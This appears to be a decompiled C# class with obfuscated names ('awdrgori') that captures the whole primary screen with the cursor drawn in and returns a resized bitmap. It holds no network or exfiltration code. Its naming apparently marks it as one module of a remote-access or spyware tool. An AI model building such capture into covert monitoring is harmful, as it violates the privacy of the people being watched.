using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace awdrgori;

internal class awdrgoriSCRNS
{
	private struct CURSORINFO
	{
		public int cbSize;

		public int flags;

		public IntPtr hCursor;

		public POINTAPI ptScreenPos;
	}

	private struct POINTAPI
	{
		public int x;

		public int y;
	}

	private const int awdrgoriCURSOR_SHOWING = 1;

	public Bitmap awdrgoriscreen(int mheight)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		bool flag = true;
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)137224);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.CopyFromScreen(0, 0, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
				if (flag)
				{
					CURSORINFO pci = default(CURSORINFO);
					pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
					if (GetCursorInfo(out pci) && pci.flags == 1)
					{
						DrawIcon(val2.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
						val2.ReleaseHdc();
					}
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
		int height = ((Image)val).get_Height() * (mheight * 100 / ((Image)val).get_Height()) / 100;
		int width = mheight + mheight * 100 / ((Image)val).get_Width() * mheight / 100 + 100;
		return new Bitmap((Image)(object)val, new Size(width, height));
	}

	[DllImport("user32.dll")]
	private static extern bool GetCursorInfo(out CURSORINFO pci);

	[DllImport("user32.dll")]
	private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
}
